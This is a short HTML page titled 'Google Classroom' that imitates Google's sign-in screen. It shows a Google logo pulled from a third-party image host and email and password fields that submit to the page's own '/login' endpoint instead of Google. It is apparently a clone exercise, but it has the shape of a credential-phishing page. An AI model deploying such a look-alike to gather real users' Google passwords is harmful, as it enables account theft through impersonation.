<!DOCTYPE html>
<html lang="en-US" dir="ltr">

  <head>
    <title>Google Classroom</title>
    <link href="assets/css/signup.css" rel="stylesheet" />
  </head>

  <body>
    <div class="container">
        <div class="top-content">
          <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="">
          <h2>Sign in</h2>
          <p class="heading">Use your Google Account</p>
      
        </div>
        <form action="/login" method="post">
            <div class="inputs">
                <input type="email" name="email" id="email" class="input">
                <label for="email" class="input-label">Email</label>
            </div>
            <div class="inputs">
                <input type="password" name="password" id="password" class="input">
                <label for="password" class="input-label">Password</label>
            </div>
            <p class="color"></p>
            <a href="" class="link-btn"></a>
            <div class="btn-group">
                <a href="/create" class="create-btn">Create account</a>
                <button type="submit" class="next-btn">Sign in</button>
            </div>
        </form>
    </div>

    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;300;400;600;700;800&amp;display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
  </body>

</html>
